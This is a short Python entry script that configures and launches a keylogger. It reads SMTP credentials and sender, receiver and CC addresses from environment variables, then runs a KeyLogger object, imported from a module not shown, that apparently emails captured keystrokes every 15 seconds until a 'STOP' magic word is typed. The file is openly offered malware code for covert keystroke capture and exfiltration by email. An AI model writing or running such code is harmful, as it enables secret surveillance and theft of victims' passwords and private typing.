import os
from dotenv import load_dotenv
from keylogger import KeyLogger

load_dotenv()

SMTP_SERVER = os.getenv("SMTP_SERVER")
SMTP_PORT = os.getenv("SMTP_PORT")
EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
EMAIL_SENDER = os.getenv("EMAIL_SENDER")
EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")
EMAIL_CC = os.getenv("EMAIL_CC")
SEND_REPORT_EVERY = 15  # seconds
MAGIC_WORD = "STOP"


def main():
    keylogger = KeyLogger(
        SEND_REPORT_EVERY,
        SMTP_SERVER,
        SMTP_PORT,
        EMAIL_ADDRESS,
        EMAIL_PASSWORD,
        EMAIL_SENDER,
        EMAIL_RECEIVER,
        EMAIL_CC,
        MAGIC_WORD,
    )
    keylogger.run()


if __name__ == "__main__":
    main()
